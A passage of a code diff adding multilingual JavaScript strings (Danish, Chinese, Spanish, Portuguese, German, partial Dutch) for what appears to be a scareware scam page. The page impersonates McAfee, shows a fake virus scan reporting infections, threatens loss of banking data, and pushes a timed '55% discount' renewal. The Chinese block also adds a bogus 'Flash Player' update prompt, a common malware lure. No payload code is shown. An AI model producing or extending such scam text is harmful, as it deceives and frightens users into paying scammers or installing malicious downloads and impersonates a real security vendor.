+document.getElementById('w5_002').innerHTML = 'Vælger inficerede områder og filer...';
+document.getElementById('w5_003').innerHTML = 'Valgte områder og filer isoleret...';
+document.getElementById('w5_004').innerHTML = 'Kontrollerer systemtilladelser';
+document.getElementById('w5_005').innerHTML = 'Kontrollerer systemstatus...';
+document.getElementById('w5_006').innerHTML = 'Kontrollerer McAfee-abonnementsstatus...';
+document.getElementById('w5_007').innerHTML = 'Pause';
+document.getElementById('w5_008').innerHTML = 'Stop';
+
+document.getElementById('w6_000').innerHTML = 'Advarsel! Din antivirusbeskyttelse er ikke aktiveret!';
+document.getElementById('w6_001').innerHTML = 'Identificerede vira:';
+document.getElementById('w6_003').innerHTML = 'Din antivirusbeskyttelse er udløbet<br> den';
+document.getElementById('w6_004').innerHTML = 'Da din computer potentielt er inficeret med (7) forskellige virus, er det essentielt at forny dit antivirussoftware for at beskytte dine personlige oplysninger, forhindre yderligere skader og genoprette systemets integritet og sikkerhed. Ignorering af fornyelse af antivirus vil resultere i tab af bankoplysninger, personlige oplysninger og andre værdifulde oplysninger fra din computer.';
+document.getElementById('w6_005').innerHTML = 'Uden beskyttelse er din computer i fare for vira og andre malware.';
+document.getElementById('w6_006').innerHTML = '55% Rabat!';
+document.getElementById('w6_007').innerHTML = 'Tilbuddet udløber om:';
+document.getElementById('w6_008').innerHTML = 'Minutter';
+document.getElementById('w6_009').innerHTML = 'Sekunder';
+document.getElementById('w6_010').innerHTML = 'Forny nu';
+
+document.getElementById('risk').innerHTML = 'Risiko';
+document.getElementById('high').innerHTML = 'Høj';
+document.getElementById('origin').innerHTML = 'Kilde';
+document.getElementById('notavl').innerHTML = 'Utilgængelig';
+document.getElementById('actvty').innerHTML = 'Aktivitet';
+document.getElementById('thretaction').innerHTML = 'Trusselhandling udført: 1';
+document.getElementById('risk2').innerHTML = 'Risiko';
+document.getElementById('high2').innerHTML = 'Høj';
+document.getElementById('origin2').innerHTML = 'Kilde';
+document.getElementById('notavl2').innerHTML = 'Utilgængelig';
+document.getElementById('actvty2').innerHTML = 'Aktivitet';
+document.getElementById('thretaction2').innerHTML = 'Trusselhandling udført: 1';
+document.getElementById('risk3').innerHTML = 'Risiko';
+document.getElementById('high3').innerHTML = 'Høj';
+document.getElementById('origin3').innerHTML = 'Kilde';
+document.getElementById('notavl3').innerHTML = 'Utilgængelig';
+document.getElementById('actvty3').innerHTML = 'Aktivitet';
+document.getElementById('thretaction3').innerHTML = 'Trusselhandling udført: 1';
+}
+
+
+
+
+//chinese Traditional
+if (lang == 'zh') {
+document.getElementById('modal_f01').innerHTML = "軟件更新";
+document.getElementById('modal_f03').innerHTML = "更新您的<span> Flash Player</span>";
+document.getElementById('modal_f04').innerHTML = "安裝最新的 Flash Player 以獲得更好的性能。";
+document.getElementById('btnUpdateNow').innerHTML = "立即更新";
+document.getElementById('modal_f05').innerHTML = "\"Flash Player\" 是您的瀏覽器必備的插件，允許您瀏覽從視頻到遊戲和動畫的所有內容。<br><br>要繼續使用 \"Flash Player\"，請下載更新版本。";
+document.getElementById('modal_f06').innerHTML = "點擊 \"下載 Flash\"";
+document.getElementById('modal_f07').innerHTML = "安裝更新並享受性能提升";
+document.getElementById('closeBtn').innerHTML = "下載 Flash Player";
+document.getElementById('alrt_updated_btn').innerHTML = "更新";
+
+
+document.getElementById('w1_001').innerHTML = "安全警告 - 潛在病毒感染";
+document.getElementById('w1_003').innerHTML = "你可能已經訪問過了不安全的網站";
+document.getElementById('w1_004').innerHTML = "您的電腦有受到病毒感染的風險";
+document.getElementById('w1_005').innerHTML = "為了能夠繼續安全瀏覽, 請開始執行防毒掃描";
+document.getElementById('w1_006').innerHTML = "掃描";	
+
+document.getElementById('w1_3').innerHTML = '你已經被保護了';
+document.getElementById('w1_4').innerHTML = '保護更新：';
+document.getElementById('w1_5').innerHTML = '當前';
+document.getElementById('w1_6').innerHTML = '上次掃描：';
+document.getElementById('w1_7').innerHTML = '無法使用';
+document.getElementById('w1_8').innerHTML = '|快速掃描';
+document.getElementById('w1_9').innerHTML = '使用的許可證：';
+document.getElementById('w1_10').innerHTML = '1之5';
+document.getElementById('w1_11').innerHTML = '|在其他設備上安裝';
+document.getElementById('w1_12').innerHTML = '安全';
+document.getElementById('w1_13').innerHTML = '受保護的';
+document.getElementById('w1_14').innerHTML = '敏感數據';
+document.getElementById('w1_13a').innerHTML = '受保護的';
+document.getElementById('w1_15').innerHTML = '性能';
+document.getElementById('w1_15a').innerHTML = '雲';
+document.getElementById('w1_15b').innerHTML = '受保護的';
+document.getElementById('w1_13d').innerHTML = '文件';
+document.getElementById('w1_13b').innerHTML = '受保護的';
+document.getElementById('w1_16').innerHTML = '更多 McAfee';
+document.getElementById('w1_16a').innerHTML = '造訪網站';
+document.getElementById('w1_13c').innerHTML = '受保護的';
+document.getElementById('w1_17').innerHTML = '訂閱狀態：';
+document.getElementById('w1_18').innerHTML = '剩餘30天';
+
+
+document.getElementById('w2_1').innerHTML = 'McAfee';
+document.getElementById('w2_2').innerHTML = '掃描...';
+document.getElementById('w2_2b').innerHTML = '病毒和惡意軟體';
+document.getElementById('w2_3').innerHTML = '掃描常見感染區域和系統文件…';
+document.getElementById('w2_6').innerHTML = '結果匯總';
+document.getElementById('w2_7').innerHTML = '[+]掃描的項目總數：';
+document.getElementById('w2_8').innerHTML = '[+]檢測到的總安全風險：';
+document.getElementById('w2_9').innerHTML = '[+]解決的總安全風險：';
+document.getElementById('w2_9b').innerHTML = '結果匯總';
+document.getElementById('w2_11').innerHTML = '暫停';
+document.getElementById('w2_12').innerHTML = '停止';
+	
+document.getElementById('w3_1').innerHTML = '您的電腦感染了5種病毒！';
+document.getElementById('w3_2').innerHTML = '立即更新以保護您的PC。';
+document.getElementById('w3_3').innerHTML = '如果您的PC沒有受到保護，則容易受到病毒和其他惡意軟件的威脅。';
+document.getElementById('w3_6').innerHTML = '繼續…';	
+					
+document.getElementById('w5_001').innerHTML = '處理中：請不要關閉';
+document.getElementById('w5_001a').innerHTML = '維修進行中...';
+document.getElementById('w5_002').innerHTML = '選定感染區域與檔案...';
+document.getElementById('w5_003').innerHTML = '選定區域與檔案已被隔離...';
+document.getElementById('w5_004').innerHTML = '檢查系統權限';
+document.getElementById('w5_005').innerHTML = '檢查系統狀態...';
+document.getElementById('w5_006').innerHTML = '檢查 McAfee 訂閱狀態...';
+document.getElementById('w5_007').innerHTML = '暫停';
+document.getElementById('w5_008').innerHTML = '停止';			
+			
+document.getElementById('w6_000').innerHTML = '警告！ 您的防毒保護未啟動！';
+document.getElementById('w6_001').innerHTML = '已識別病毒：';
+document.getElementById('w6_003').innerHTML = '您的防病毒保護 已於以下日期過期：';
+document.getElementById('w6_004').innerHTML = '鑑於您的電腦可能已感染(7)種不同的病毒，更新您的防病毒軟體對於保護您的個人信息、防止進一步損害以及恢復系統的完整性和安全性至關重要。忽視防病毒軟體的更新將導致銀行資料、個人信息和其他有價值信息的丟失。';	
+document.getElementById('w6_005').innerHTML = '如果您的電腦沒有保護，將有受到病毒和其他惡意軟體的風險。';
+document.getElementById('w6_006').innerHTML = '55% 折扣！';
+document.getElementById('w6_007').innerHTML = '優惠倒數：';
+document.getElementById('w6_008').innerHTML = '分鐘';
+document.getElementById('w6_009').innerHTML = '秒';
+document.getElementById('w6_010').innerHTML = '立即續訂';
+
+
+document.getElementById('risk').innerHTML = '風險';
+document.getElementById('high').innerHTML = '高';
+document.getElementById('origin').innerHTML = '來源';
+document.getElementById('notavl').innerHTML = '不可用';
+document.getElementById('actvty').innerHTML = '活動';
+document.getElementById('thretaction').innerHTML = '已執行威脅行動：1';
+document.getElementById('risk2').innerHTML = '風險';
+document.getElementById('high2').innerHTML = '高';
+document.getElementById('origin2').innerHTML = '來源';
+document.getElementById('notavl2').innerHTML = '不可用';
+document.getElementById('actvty2').innerHTML = '活動';
+document.getElementById('thretaction2').innerHTML = '已執行威脅行動：1';
+document.getElementById('risk3').innerHTML = '風險';
+document.getElementById('high3').innerHTML = '高';
+document.getElementById('origin3').innerHTML = '來源';
+document.getElementById('notavl3').innerHTML = '不可用';
+document.getElementById('actvty3').innerHTML = '活動';
+document.getElementById('thretaction3').innerHTML = '已執行威脅行動：1';
+
+}
+
+//Spanish(es)
+if (lang == 'es') {
+document.getElementById('w1_001').innerHTML = "Advertencia de seguridad - Posible infección por virus";
+document.getElementById('w1_003').innerHTML = "Puede haber visitado sitios web inseguros con contenido malicioso";
+document.getElementById('w1_004').innerHTML = "Su PC corre el riesgo de ser infectada por virus";
+document.getElementById('w1_005').innerHTML = "Para seguir navegando de forma segura - realice un escaneo antivirus";
+document.getElementById('w1_006').innerHTML = "Ejecutar Escaneo Rápido"; 
+
+document.getElementById('w1_3').innerHTML = 'Está protegido';
+document.getElementById('w1_4').innerHTML = 'Actualizaciones de protección:';
+document.getElementById('w1_5').innerHTML = 'Actual';
+document.getElementById('w1_6').innerHTML = 'Último Escaneo:';
+document.getElementById('w1_7').innerHTML = 'No disponible';
+document.getElementById('w1_8').innerHTML = 'Ejecutar Escaneo Rápido';
+document.getElementById('w1_9').innerHTML = 'Licencia Utilizada:';
+document.getElementById('w1_10').innerHTML = '1 de 5';
+document.getElementById('w1_11').innerHTML = 'Instalar en Otro Dispositivo';
+document.getElementById('w1_12').innerHTML = 'Sistema';
+document.getElementById('w1_13').innerHTML = 'Protegido';
+document.getElementById('w1_14').innerHTML = 'Navegadores';
+document.getElementById('w1_13a').innerHTML = 'Protegido';
+document.getElementById('w1_15').innerHTML = 'Rendimiento';
+document.getElementById('w1_15a').innerHTML = 'Nube';
+document.getElementById('w1_15b').innerHTML = 'Archivos';
+document.getElementById('w1_13d').innerHTML = 'Documentos';
+document.getElementById('w1_13b').innerHTML = 'Protegido';
+document.getElementById('w1_16').innerHTML = 'Más McAfee';
+document.getElementById('w1_16a').innerHTML = 'Visitar Sitio Web';
+document.getElementById('w1_13c').innerHTML = 'Protegido';
+document.getElementById('w1_17').innerHTML = 'Estado de Suscripción:';
+document.getElementById('w1_18').innerHTML = 'Quedan 30 Días';
+
+document.getElementById('w2_1').innerHTML = 'Escaneo Rápido';
+document.getElementById('w2_2').innerHTML = 'Escaneando...';
+document.getElementById('w2_2b').innerHTML = 'Virus y Malware';
+document.getElementById('w2_3').innerHTML = 'Escaneando áreas comúnmente infectadas y archivos de inicio...';
+document.getElementById('w2_6').innerHTML = 'Resultados del Escaneo';
+document.getElementById('w2_7').innerHTML = '[+] Total de Elementos Escaneados:';
+document.getElementById('w2_8').innerHTML = '[+] Total de Riesgos de Seguridad Detectados:';
+document.getElementById('w2_9').innerHTML = '[+] Total de Riesgos de Seguridad Resueltos:';
+document.getElementById('w2_9b').innerHTML = 'Resumen del Resultado';
+document.getElementById('w2_11').innerHTML = 'Pausa';
+document.getElementById('w2_12').innerHTML = 'Detener';
+    
+document.getElementById('w3_1').innerHTML = '¡Su computadora está infectada con (5) virus!';
+document.getElementById('w3_2').innerHTML = 'Actualice ahora para proteger su PC.';
+document.getElementById('w3_3').innerHTML = 'Sin protección, su PC es vulnerable a virus y otras amenazas de malware.';
+document.getElementById('w3_6').innerHTML = 'Continuar…';    
+    
+document.getElementById('w5_001').innerHTML = 'En Progreso: Por favor no cierre';
+document.getElementById('w5_001a').innerHTML = 'Reparación en Progreso...';
+document.getElementById('w5_002').innerHTML = 'Seleccionando áreas y archivos infectados...';
+document.getElementById('w5_003').innerHTML = 'Áreas y archivos seleccionados aislados...';
+document.getElementById('w5_004').innerHTML = 'Comprobando permisos del sistema';
+document.getElementById('w5_005').innerHTML = 'Comprobando estado del sistema...';
+document.getElementById('w5_006').innerHTML = 'Comprobando estado de suscripción de McAfee...';
+document.getElementById('w5_007').innerHTML = 'Pausa';
+document.getElementById('w5_008').innerHTML = 'Detener';            
+
+document.getElementById('w6_000').innerHTML = '¡Advertencia! ¡Su protección antivirus no está activada!';
+document.getElementById('w6_001').innerHTML = 'Virus identificados:';
+document.getElementById('w6_003').innerHTML = 'Su Protección Antivirus Ha Caducado<br> En';
+document.getElementById('w6_004').innerHTML = 'Dado que su computadora está potencialmente infectada con (7) virus diferentes, renovar su software antivirus es esencial para proteger su información personal, prevenir daños adicionales y restaurar la integridad y seguridad de su sistema. Ignorar la renovación del antivirus resultará en la pérdida de datos bancarios, información personal y otros datos valiosos de su computadora.'; 
+document.getElementById('w6_005').innerHTML = 'Sin protección, su computadora está en riesgo de virus y otro malware.';
+document.getElementById('w6_006').innerHTML = '¡55% de Descuento!';
+document.getElementById('w6_007').innerHTML = 'La Oferta Expira En:';
+document.getElementById('w6_008').innerHTML = 'Minutos';
+document.getElementById('w6_009').innerHTML = 'Segundos';
+document.getElementById('w6_010').innerHTML = 'Renovar Ahora';
+
+document.getElementById('risk').innerHTML = 'Riesgo';
+document.getElementById('high').innerHTML = 'Alto';
+document.getElementById('origin').innerHTML = 'Origen';
+document.getElementById('notavl').innerHTML = 'No disponible';
+document.getElementById('actvty').innerHTML = 'Actividad';
+document.getElementById('thretaction').innerHTML = 'Acciones de Amenaza Ejecutadas: 1';
+document.getElementById('risk2').innerHTML = 'Riesgo';
+document.getElementById('high2').innerHTML = 'Alto';
+document.getElementById('origin2').innerHTML = 'Origen';
+document.getElementById('notavl2').innerHTML = 'No disponible';
+document.getElementById('actvty2').innerHTML = 'Actividad';
+document.getElementById('thretaction2').innerHTML = 'Acciones de Amenaza Ejecutadas: 1';
+document.getElementById('risk3').innerHTML = 'Riesgo';
+document.getElementById('high3').innerHTML = 'Alto';
+document.getElementById('origin3').innerHTML = 'Origen';
+document.getElementById('notavl3').innerHTML = 'No disponible';
+document.getElementById('actvty3').innerHTML = 'Actividad';
+document.getElementById('thretaction3').innerHTML = 'Acciones de Amenaza Ejecutadas: 1';
+}
+
+
+//Portuguese(pt)
+if (lang == 'pt') {
+document.getElementById('w1_001').innerHTML = "Aviso de segurança - Possível infecção por vírus";
+document.getElementById('w1_003').innerHTML = "Você pode ter visitado sites inseguros com conteúdo malicioso";
+document.getElementById('w1_004').innerHTML = "Seu PC está em risco de ser infectado por vírus";
+document.getElementById('w1_005').innerHTML = "Para continuar navegando com segurança - faça uma verificação antivírus";
+document.getElementById('w1_006').innerHTML = "Executar Verificação Rápida"; 
+
+document.getElementById('w1_3').innerHTML = 'Você está protegido';
+document.getElementById('w1_4').innerHTML = 'Atualizações de proteção:';
+document.getElementById('w1_5').innerHTML = 'Atual';
+document.getElementById('w1_6').innerHTML = 'Última Verificação:';
+document.getElementById('w1_7').innerHTML = 'Não disponível';
+document.getElementById('w1_8').innerHTML = 'Executar Verificação Rápida';
+document.getElementById('w1_9').innerHTML = 'Licença Utilizada:';
+document.getElementById('w1_10').innerHTML = '1 de 5';
+document.getElementById('w1_11').innerHTML = 'Instalar em Outro Dispositivo';
+document.getElementById('w1_12').innerHTML = 'Sistema';
+document.getElementById('w1_13').innerHTML = 'Protegido';
+document.getElementById('w1_14').innerHTML = 'Navegadores';
+document.getElementById('w1_13a').innerHTML = 'Protegido';
+document.getElementById('w1_15').innerHTML = 'Desempenho';
+document.getElementById('w1_15a').innerHTML = 'Nuvem';
+document.getElementById('w1_15b').innerHTML = 'Arquivos';
+document.getElementById('w1_13d').innerHTML = 'Documentos';
+document.getElementById('w1_13b').innerHTML = 'Protegido';
+document.getElementById('w1_16').innerHTML = 'Mais McAfee';
+document.getElementById('w1_16a').innerHTML = 'Visitar Site';
+document.getElementById('w1_13c').innerHTML = 'Protegido';
+document.getElementById('w1_17').innerHTML = 'Status da Assinatura:';
+document.getElementById('w1_18').innerHTML = '30 Dias Restantes';
+
+document.getElementById('w2_1').innerHTML = 'Verificação Rápida';
+document.getElementById('w2_2').innerHTML = 'Verificando...';
+document.getElementById('w2_2b').innerHTML = 'Vírus e Malware';
+document.getElementById('w2_3').innerHTML = 'Verificando áreas comumente infectadas e arquivos de inicialização...';
+document.getElementById('w2_6').innerHTML = 'Resultados da Verificação';
+document.getElementById('w2_7').innerHTML = '[+] Total de Itens Verificados:';
+document.getElementById('w2_8').innerHTML = '[+] Total de Riscos de Segurança Detectados:';
+document.getElementById('w2_9').innerHTML = '[+] Total de Riscos de Segurança Resolvidos:';
+document.getElementById('w2_9b').innerHTML = 'Resumo do Resultado';
+document.getElementById('w2_11').innerHTML = 'Pausar';
+document.getElementById('w2_12').innerHTML = 'Parar';
+    
+document.getElementById('w3_1').innerHTML = 'Seu computador está infectado com (5) vírus!';
+document.getElementById('w3_2').innerHTML = 'Atualize agora para proteger seu PC.';
+document.getElementById('w3_3').innerHTML = 'Sem proteção, seu PC está vulnerável a vírus e outras ameaças de malware.';
+document.getElementById('w3_6').innerHTML = 'Continuar…';    
+    
+document.getElementById('w5_001').innerHTML = 'Em Progresso: Por favor, não feche';
+document.getElementById('w5_001a').innerHTML = 'Reparo em Progresso...';
+document.getElementById('w5_002').innerHTML = 'Selecionando áreas e arquivos infectados...';
+document.getElementById('w5_003').innerHTML = 'Áreas e arquivos selecionados isolados...';
+document.getElementById('w5_004').innerHTML = 'Verificando permissões do sistema';
+document.getElementById('w5_005').innerHTML = 'Verificando estado do sistema...';
+document.getElementById('w5_006').innerHTML = 'Verificando status da assinatura do McAfee...';
+document.getElementById('w5_007').innerHTML = 'Pausar';
+document.getElementById('w5_008').innerHTML = 'Parar';            
+
+document.getElementById('w6_000').innerHTML = 'Aviso! Sua proteção antivírus não está ativada!';
+document.getElementById('w6_001').innerHTML = 'Vírus identificados:';
+document.getElementById('w6_003').innerHTML = 'Sua Proteção Antivírus Expirou<br> Em';
+document.getElementById('w6_004').innerHTML = 'Considerando que o seu computador está potencialmente infectado com (7) vírus diferentes, renovar o seu software antivírus é essencial para proteger suas informações pessoais, prevenir danos adicionais e restaurar a integridade e segurança do seu sistema. Ignorar a renovação do antivírus resultará na perda de dados bancários, informações pessoais e outras informações valiosas do seu computador.'; 
+document.getElementById('w6_005').innerHTML = 'Sem proteção, seu computador está em risco de vírus e outros malwares.';
+document.getElementById('w6_006').innerHTML = 'Desconto de 55%!';
+document.getElementById('w6_007').innerHTML = 'A Oferta Expira Em:';
+document.getElementById('w6_008').innerHTML = 'Minutos';
+document.getElementById('w6_009').innerHTML = 'Segundos';
+document.getElementById('w6_010').innerHTML = 'Renovar Agora';
+
+document.getElementById('risk').innerHTML = 'Risco';
+document.getElementById('high').innerHTML = 'Alto';
+document.getElementById('origin').innerHTML = 'Origem';
+document.getElementById('notavl').innerHTML = 'Não disponível';
+document.getElementById('actvty').innerHTML = 'Atividade';
+document.getElementById('thretaction').innerHTML = 'Ações de Ameaça Executadas: 1';
+document.getElementById('risk2').innerHTML = 'Risco';
+document.getElementById('high2').innerHTML = 'Alto';
+document.getElementById('origin2').innerHTML = 'Origem';
+document.getElementById('notavl2').innerHTML = 'Não disponível';
+document.getElementById('actvty2').innerHTML = 'Atividade';
+document.getElementById('thretaction2').innerHTML = 'Ações de Ameaça Executadas: 1';
+document.getElementById('risk3').innerHTML = 'Risco';
+document.getElementById('high3').innerHTML = 'Alto';
+document.getElementById('origin3').innerHTML = 'Origem';
+document.getElementById('notavl3').innerHTML = 'Não disponível';
+document.getElementById('actvty3').innerHTML = 'Atividade';
+document.getElementById('thretaction3').innerHTML = 'Ações de Ameaça Executadas: 1';
+}
+
+// German(DE)
+if (lang == 'de') {
+document.getElementById('w1_001').innerHTML = "Sicherheitswarnung - Mögliche Virusinfektion";
+document.getElementById('w1_003').innerHTML = "Sie haben möglicherweise unsichere Websites mit schädlichen Inhalten besucht";
+document.getElementById('w1_004').innerHTML = "Ihr PC ist gefährdet, von Viren infiziert zu werden";
+document.getElementById('w1_005').innerHTML = "Um sicher weiter zu surfen - führen Sie einen Virenscan durch";
+document.getElementById('w1_006').innerHTML = "Schnellscan durchführen";	
+
+document.getElementById('w1_3').innerHTML = 'Sie sind geschützt';
+document.getElementById('w1_4').innerHTML = 'Schutzaktualisierungen:';
+document.getElementById('w1_5').innerHTML = 'Aktuell';
+document.getElementById('w1_6').innerHTML = 'Letzter Scan:';
+document.getElementById('w1_7').innerHTML = 'Nicht verfügbar';
+document.getElementById('w1_8').innerHTML = 'Schnellscan durchführen';
+document.getElementById('w1_9').innerHTML = 'Lizenz verwendet:';
+document.getElementById('w1_10').innerHTML = '1 von 5';
+document.getElementById('w1_11').innerHTML = 'Auf einem anderen Gerät installieren';
+document.getElementById('w1_12').innerHTML = 'System';
+document.getElementById('w1_13').innerHTML = 'Geschützt';
+document.getElementById('w1_14').innerHTML = 'Browser';
+document.getElementById('w1_13a').innerHTML = 'Geschützt';
+document.getElementById('w1_15').innerHTML = 'Leistung';
+document.getElementById('w1_15a').innerHTML = 'Cloud';
+document.getElementById('w1_15b').innerHTML = 'Dateien';
+document.getElementById('w1_13d').innerHTML = 'Dokumente';
+document.getElementById('w1_13b').innerHTML = 'Geschützt';
+document.getElementById('w1_16').innerHTML = 'Mehr McAfee';
+document.getElementById('w1_16a').innerHTML = 'Website besuchen';
+document.getElementById('w1_13c').innerHTML = 'Geschützt';
+document.getElementById('w1_17').innerHTML = 'Abonnementstatus:';
+document.getElementById('w1_18').innerHTML = '30 Tage verbleibend';
+
+document.getElementById('w2_1').innerHTML = 'Schnellscan';
+document.getElementById('w2_2').innerHTML = 'Wird gescannt...';
+document.getElementById('w2_2b').innerHTML = 'Viren und Malware';
+document.getElementById('w2_3').innerHTML = 'Gängige infizierte Bereiche und Startdateien werden gescannt...';
+document.getElementById('w2_6').innerHTML = 'Scanergebnisse';
+document.getElementById('w2_7').innerHTML = '[+] Gesamtanzahl gescannter Elemente:';
+document.getElementById('w2_8').innerHTML = '[+] Gesamtzahl erkannter Sicherheitsrisiken:';
+document.getElementById('w2_9').innerHTML = '[+] Gesamtzahl behobener Sicherheitsrisiken:';
+document.getElementById('w2_9b').innerHTML = 'Ergebniszusammenfassung';
+document.getElementById('w2_11').innerHTML = 'Pause';
+document.getElementById('w2_12').innerHTML = 'Stop';
+
+document.getElementById('w3_1').innerHTML = 'Ihr Computer ist mit (5) Viren infiziert!';
+document.getElementById('w3_2').innerHTML = 'Aktualisieren Sie jetzt, um Ihren PC zu schützen.';
+document.getElementById('w3_3').innerHTML = 'Ohne Schutz ist Ihr PC anfällig für Viren und andere Malware-Bedrohungen.';
+document.getElementById('w3_6').innerHTML = 'Weiter…';
+
+document.getElementById('w5_001').innerHTML = 'In Bearbeitung: Bitte nicht schließen';
+document.getElementById('w5_001a').innerHTML = 'Reparatur in Bearbeitung...';
+document.getElementById('w5_002').innerHTML = 'Infizierte Bereiche und Dateien auswählen...';
+document.getElementById('w5_003').innerHTML = 'Ausgewählte Bereiche und Dateien isoliert...';
+document.getElementById('w5_004').innerHTML = 'Überprüfung der Systemberechtigungen';
+document.getElementById('w5_005').innerHTML = 'Systemstatus überprüfen...';
+document.getElementById('w5_006').innerHTML = 'Der Status des McAfee-Abonnements wird überprüft...';
+document.getElementById('w5_007').innerHTML = 'Pause';
+document.getElementById('w5_008').innerHTML = 'Stop';
+
+document.getElementById('w6_000').innerHTML = 'Warnung! Ihr Antivirus-Schutz ist nicht aktiviert!';
+document.getElementById('w6_001').innerHTML = 'Identifizierte Viren:';
+document.getElementById('w6_003').innerHTML = 'Ihr Antivirus-Schutz ist abgelaufen<br> Am';
+document.getElementById('w6_004').innerHTML = 'Angesichts der Tatsache, dass Ihr Computer möglicherweise mit (7) verschiedenen Viren infiziert ist, ist die Erneuerung Ihrer Antivirensoftware unerlässlich, um Ihre persönlichen Daten zu schützen, weiteren Schaden zu verhindern und die Integrität und Sicherheit Ihres Systems wiederherzustellen. Wenn Sie die Erneuerung des Antivirusprogramms ignorieren, führt dies zum Verlust von Bankdaten, persönlichen Informationen und anderen wertvollen Informationen auf Ihrem Computer.';
+document.getElementById('w6_005').innerHTML = 'Ohne Schutz ist Ihr Computer gefährdet durch Viren und andere Malware.';
+document.getElementById('w6_006').innerHTML = '55% Rabatt!';
+document.getElementById('w6_007').innerHTML = 'Angebot endet in:';
+document.getElementById('w6_008').innerHTML = 'Minuten';
+document.getElementById('w6_009').innerHTML = 'Sekunden';
+document.getElementById('w6_010').innerHTML = 'Jetzt erneuern';
+
+document.getElementById('risk').innerHTML = 'Risiko';
+document.getElementById('high').innerHTML = 'Hoch';
+document.getElementById('origin').innerHTML = 'Quelle';
+document.getElementById('notavl').innerHTML = 'Nicht verfügbar';
+document.getElementById('actvty').innerHTML = 'Aktivität';
+document.getElementById('thretaction').innerHTML = 'Bedrohungsaktionen ausgeführt: 1';
+document.getElementById('risk2').innerHTML = 'Risiko';
+document.getElementById('high2').innerHTML = 'Hoch';
+document.getElementById('origin2').innerHTML = 'Quelle';
+document.getElementById('notavl2').innerHTML = 'Nicht verfügbar';
+document.getElementById('actvty2').innerHTML = 'Aktivität';
+document.getElementById('thretaction2').innerHTML = 'Bedrohungsaktionen ausgeführt: 1';
+document.getElementById('risk3').innerHTML = 'Risiko';
+document.getElementById('high3').innerHTML = 'Hoch';
+document.getElementById('origin3').innerHTML = 'Quelle';
+document.getElementById('notavl3').innerHTML = 'Nicht verfügbar';
+document.getElementById('actvty3').innerHTML = 'Aktivität';
+document.getElementById('thretaction3').innerHTML = 'Bedrohungsaktionen ausgeführt: 1';
+}
+
+// Dutch(NL)
+if (lang == 'nl') {
+document.getElementById('w1_001').innerHTML = "Beveiligingswaarschuwing - Mogelijke virusinfectie";
+document.getElementById('w1_003').innerHTML = "U heeft mogelijk onveilige websites bezocht met schadelijke inhoud";
+document.getElementById('w1_004').innerHTML = "Uw pc loopt het risico te worden geïnfecteerd door virussen";
+document.getElementById('w1_005').innerHTML = "Om veilig door te kunnen gaan met browsen - voer een antivirus scan uit";
+document.getElementById('w1_006').innerHTML = "Voer een snelle scan uit";	
+
+document.getElementById('w1_3').innerHTML = 'U bent beschermd';
+document.getElementById('w1_4').innerHTML = 'Beschermingsupdates:';
+document.getElementById('w1_5').innerHTML = 'Huidig';
+document.getElementById('w1_6').innerHTML = 'Laatste scan:';
+document.getElementById('w1_7').innerHTML = 'Niet beschikbaar';
+document.getElementById('w1_8').innerHTML = 'Voer een snelle scan uit';
+document.getElementById('w1_9').innerHTML = 'Licentie gebruikt:';
+document.getElementById('w1_10').innerHTML = '1 van 5';
+document.getElementById('w1_11').innerHTML = 'Installeren op een ander apparaat';
+document.getElementById('w1_12').innerHTML = 'Systeem';
+document.getElementById('w1_13').innerHTML = 'Beschermd';
+document.getElementById('w1_14').innerHTML = 'Browsers';
+document.getElementById('w1_13a').innerHTML = 'Beschermd';
+document.getElementById('w1_15').innerHTML = 'Prestatie';
+document.getElementById('w1_15a').innerHTML = 'Cloud';
+document.getElementById('w1_15b').innerHTML = 'Bestanden';
+document.getElementById('w1_13d').innerHTML = 'Documenten';
+document.getElementById('w1_13b').innerHTML = 'Beschermd';
+document.getElementById('w1_16').innerHTML = 'Meer McAfee';
+document.getElementById('w1_16a').innerHTML = 'Website bezoeken';
+document.getElementById('w1_13c').innerHTML = 'Beschermd';
+document.getElementById('w1_17').innerHTML = 'Abonnementsstatus:';
+document.getElementById('w1_18').innerHTML = '30 dagen resterend';
+
+document.getElementById('w2_1').innerHTML = 'Snelle scan';
+document.getElementById('w2_2').innerHTML = 'Bezig met scannen...';
+document.getElementById('w2_2b').innerHTML = 'Virussen en malware';
+document.getElementById('w2_3').innerHTML = 'Veelvoorkomende geïnfecteerde gebieden en opstartbestanden worden gescand...';
+document.getElementById('w2_6').innerHTML = 'Scanresultaten';
+document.getElementById('w2_7').innerHTML = '[+] Totaal aantal gescande items:';
+document.getElementById('w2_8').innerHTML = '[+] Totaal aantal gedetecteerde beveiligingsrisico\'s:';
+document.getElementById('w2_9').innerHTML = '[+] Totaal aantal opgeloste beveiligingsrisico\'s:';
+document.getElementById('w2_9b').innerHTML = 'Resultaatsamenvatting';
+document.getElementById('w2_11').innerHTML = 'Pauze';
+document.getElementById('w2_12').innerHTML = 'Stop';
+
+document.getElementById('w3_1').innerHTML = 'Uw computer is geïnfecteerd met (5) virussen!';
+document.getElementById('w3_2').innerHTML = 'Update nu om uw pc te beschermen.';
+document.getElementById('w3_3').innerHTML = 'Zonder bescherming is uw pc kwetsbaar voor virussen en andere malware-bedreigingen.';
+document.getElementById('w3_6').innerHTML = 'Doorgaan…';
+
+document.getElementById('w5_001').innerHTML = 'Bezig: Gelieve niet te sluiten';
+document.getElementById('w5_001a').innerHTML = 'Reparatie bezig...';
+document.getElementById('w5_002').innerHTML = 'Geselecteerde geïnfecteerde gebieden en bestanden...';
+document.getElementById('w5_003').innerHTML = 'Geselecteerde gebieden en bestanden geïsoleerd...';
+document.getElementById('w5_004').innerHTML = 'Controleren van systeemrechten';
+document.getElementById('w5_005').innerHTML = 'Controleren van systeemstatus...';
+document.getElementById('w5_006').innerHTML = 'McAfee-abonnementsstatus controleren...';
+document.getElementById('w5_007').innerHTML = 'Pauze';
+document.getElementById('w5_008').innerHTML = 'Stop';
+
+document.getElementById('w6_000').innerHTML = 'Waarschuwing! Uw antivirusbescherming is niet geactiveerd!';
+document.getElementById('w6_001').innerHTML = 'Geïdentificeerde virussen:';
+document.getElementById('w6_003').innerHTML = 'Uw antivirusbescherming is verlopen<br> Op';
+document.getElementById('w6_004').innerHTML = 'Aangezien uw computer mogelijk is geïnfecteerd met (7) verschillende virussen, is het essentieel om uw antivirussoftware te vernieuwen om uw persoonlijke informatie te beschermen, verdere schade te voorkomen en de integriteit en beveiliging van uw systeem te herstellen. Het negeren van de vernieuwing van antivirus zal resulteren in het verlies van bankgegevens, persoonlijke informatie en andere waardevolle informatie van uw computer.';
+document.getElementById('w6_005').innerHTML = 'Zonder bescherming loopt uw computer risico op virussen en andere malware.';
+document.getElementById('w6_006').innerHTML = '55% Korting!';
